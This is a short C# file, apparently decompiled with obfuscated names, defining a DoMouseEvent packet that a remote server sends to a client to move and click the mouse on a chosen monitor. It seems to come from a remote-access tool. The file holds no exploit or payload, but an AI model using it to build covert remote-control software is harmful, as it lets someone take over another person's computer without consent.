using System;

namespace xClient.Core.Packets.ServerPackets;

[Serializable]
public class DoMouseEvent : GInterface4
{
	public GEnum0 Action { get; set; }

	public bool IsMouseDown { get; set; }

	public int X { get; set; }

	public int Y { get; set; }

	public int MonitorIndex { get; set; }

	public DoMouseEvent()
	{
	}

	public DoMouseEvent(GEnum0 action, bool isMouseDown, int x, int y, int monitorIndex)
	{
		Action = action;
		IsMouseDown = isMouseDown;
		X = x;
		Y = y;
		MonitorIndex = monitorIndex;
	}

	public void Execute(GClass33 client)
	{
		client.method_7(this);
	}
}
